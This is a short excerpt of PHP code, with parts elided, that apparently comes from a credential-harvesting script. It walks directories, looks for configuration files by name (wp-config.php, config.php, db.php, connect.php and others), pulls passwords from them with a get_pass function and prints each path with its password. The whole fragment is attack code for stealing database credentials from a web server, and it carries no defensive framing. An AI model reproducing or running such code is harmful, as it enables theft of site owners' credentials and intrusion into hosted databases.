            ...
            if (('.' != $file) and ('..' != $file)) {
                if (is_readable($fpath)) {
                    ...
                    if (is_dir($dr)) {
                        ...
                        if (('config.php' == $file) or ('config.inc.php' == $file) or ('db.inc.php' == $file) or ('connect.php' == $file) or ('wp-config.php' == $file) or ('var.php' == $file) or ('configure.php' == $file) or ('db.php' == $file) or ('db_connect.php' == $file)) {
                            $pass = get_pass($fpath);
                            if ('' != $pass) {
                                echo "[+] $fpath\n$pass\n";
